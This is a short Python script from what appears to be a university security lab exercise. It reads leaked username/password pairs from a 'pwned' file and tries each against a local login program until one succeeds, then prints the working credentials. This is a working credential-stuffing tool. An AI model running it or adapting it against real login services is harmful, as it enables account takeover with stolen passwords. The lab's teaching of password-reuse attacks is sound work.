import time
import subprocess

# Define constants
FILE_PATH = "/home/cse/Lab1/Q4/PwnedPWfile"
WORKING_DIR = "/home/cse/Lab1/Q4/"
LOGIN_SCRIPT = "Login.pyc"

def read_credentials(file_path):
    """Reads credentials from the given file and returns a list of (user, password) tuples."""
    credentials = []
    try:
        with open(file_path, "r") as file:
            for line in file:
                parts = line.strip().split(',')
                if len(parts) == 2:
                    credentials.append((parts[0], parts[1]))
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
        return []
    return credentials

def attempt_login(user, password):
    """Attempts login with given user credentials and returns True if successful."""
    result = subprocess.run(
        ["python3", LOGIN_SCRIPT, user, password],
        capture_output=True,
        text=True,
        cwd=WORKING_DIR
    )
    return result.stdout.strip() == "Login successful."

def main():
    credentials = read_credentials(FILE_PATH)
    if not credentials:
        print("No credentials found or file is missing.")
        return

    start_time = time.time()
    print("Start time: 0.00s")

    for index, (user, password) in enumerate(credentials, start=1):
        print(f"Testing {user}, user {index}/{len(credentials)}")
        if attempt_login(user, password):
            print("Login successful!")
            print(f"\nUsername: {user}\nPassword: {password}")
            print(f"Time taken: {time.time() - start_time:.2f}s")
            break

if __name__ == "__main__":
    main()